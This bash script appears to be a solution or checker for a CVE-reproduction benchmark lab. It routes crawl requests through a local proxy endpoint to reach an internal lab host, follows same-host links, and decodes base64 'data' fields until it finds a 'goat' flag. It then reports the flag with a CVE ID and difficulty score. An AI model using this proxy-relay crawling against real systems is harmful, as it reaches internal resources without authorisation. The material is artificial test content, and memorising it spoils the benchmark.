#!/bin/bash

URL=${URL:-"http://192.168.40.68/"}
SLEEP=${SLEEP:-2}
PROXY_URL="http://localhost:1232/"
CONTENT_TYPE_HEADER='Content-Type: application/json'
CVE_ID=${CVE_ID:-"cve-1"}
TIMESTAMP=$(date +%s)
EXPLOITATION_DIFFICULTY=${EXPLOITATION_DIFFICULTY:-"0.3"}

url_host () { awk -F/ '{print $3}' <<< "$1"; }
url_scheme () { awk -F/ '{print $1}' <<< "$1"; }
post_via_proxy () {
  # $1 = absolute URL to fetch (GET)
  local url="$1"
  curl -s -X POST "$PROXY_URL" \
       -H "$CONTENT_TYPE_HEADER" \
       -d "{\"endpoint\":\"$url\",\"method\":\"GET\",\"headers\":\"\"}"
}

resolve_url () {
  local base="$1" href="$2"

  # Ignore anchors and scripts
  if [[ "$href" =~ ^# ]] || [[ "$href" =~ ^javascript: ]] || [[ "$href" =~ ^mailto: ]] || [[ "$href" =~ ^data: ]]; then
    return 1
  fi

  # Absolute URL
  if [[ "$href" =~ ^https?:// ]]; then
    printf '%s' "$href"
    return 0
  fi

  local scheme host base_dir
  scheme="$(url_scheme "$base")"
  host="$(url_host "$base")"

  # Root-relative
  if [[ "$href" == /* ]]; then
    printf '%s//%s%s' "$scheme" "$host" "$href"
    return 0
  fi

  # Path-relative
  if [[ "$base" == */ ]]; then
    base_dir="$base"
  else
    base_dir="${base%/*}/"
  fi

  printf '%s%s' "$base_dir" "$href"
}

normalize_url () {
  local url="$1"
  local scheme host path
  scheme="$(url_scheme "$url")"
  host="$(url_host "$url")"
  path="${url#*"$host"}"
  path="$(sed -E 's#/+#/#g' <<< "$path")"
  path="$(sed -E 's#/\./#/#g' <<< "$path")"
  printf '%s//%s%s' "$scheme" "$host" "$path"
}

same_host () {
  local a="$1" b="$2"
  [[ "$(url_host "$a")" == "$(url_host "$b")" ]]
}

# Treat only alpha extensions as files (e.g., .html/.json); 1.0 is NOT a file.
is_probably_file () {
  local seg="$1"
  [[ "$seg" =~ \.[A-Za-z]{1,5}($|\?) ]]
}

# Extract base64 "data" from a flat JSON line
extract_b64_data () {
  sed -nE 's/.*"data"[[:space:]]*:[[:space:]]*"([^"]*)".*/\1/p'
}

crawl_site () {

  local start_url="$1"
  declare -A VISITED=()
  local -a QUEUE=("$start_url")

  while ((${#QUEUE[@]})); do
    sleep "$SLEEP"
    local url="${QUEUE[0]}"
    QUEUE=("${QUEUE[@]:1}")

    if [[ -n "${VISITED["$url"]+x}" ]]; then
      continue
    fi
    VISITED["$url"]=1

    # echo "Visiting: $url"
    local resp
    resp="$(post_via_proxy "$url")" || resp=""
    [[ -z "$resp" ]] && continue

    # Check for "data" field 
    if grep -q '"data"' <<< "$resp"; then
      # flatten whitespace/newlines to make sed capture easier
      local flat b64 decoded
      flat="$(tr -d '\n' <<< "$resp")"
      b64="$(printf '%s' "$flat" | extract_b64_data || true)"

      if [[ -n "${b64:-}" ]]; then
        # try to decode base64; if decode fails, decoded will be empty
        decoded="$(printf '%s' "$b64" | base64 -d 2>/dev/null || true)"

        # Only accept flags that contain "goat" (case-insensitive)
        if [[ -n "${decoded:-}" ]] && printf '%s' "$decoded" | grep -qi 'goat'; then
          echo "{\"flag\": \"$decoded\", \"success\": \"true\", \"cve_id\": \"$CVE_ID\", \"timestamp\": \"$TIMESTAMP\", \"exploitation_difficulty\": \"$EXPLOITATION_DIFFICULTY\"}"
          exit 0
        fi
      fi
    fi

    # Parse links and enqueue
    while IFS= read -r href; do
      href="$(sed -E 's/^[[:space:]]+|[[:space:]]+$//g' <<< "$href")"
      [[ -z "$href" ]] && continue

      local abs
      if ! abs="$(resolve_url "$url" "$href")"; then
        continue
      fi
      abs="$(normalize_url "$abs")"
      same_host "$abs" "$start_url" || continue

      if [[ -z "${VISITED["$abs"]+x}" ]]; then
        QUEUE+=("$abs")
      fi

      # Also enqueue slash variant if likely a directory (e.g., "1.0/")
      if [[ "$abs" != */ ]]; then
        local last_seg="${abs##*/}"
        if ! is_probably_file "$last_seg"; then
          local with_slash="${abs}/"
          with_slash="$(normalize_url "$with_slash")"
          if [[ -z "${VISITED["$with_slash"]+x}" ]]; then
            QUEUE+=("$with_slash")
          fi
        fi
      fi

    done < <(grep -oP '(?i)(?<=href=")[^"]*' <<< "$resp")
  done
  echo "{\"flag\": \"\", \"success\": \"false\", \"cve_id\": \"$CVE_ID\", \"timestamp\": \"$TIMESTAMP\", \"exploitation_difficulty\": \"$EXPLOITATION_DIFFICULTY\"}"
}

crawl_site "$URL"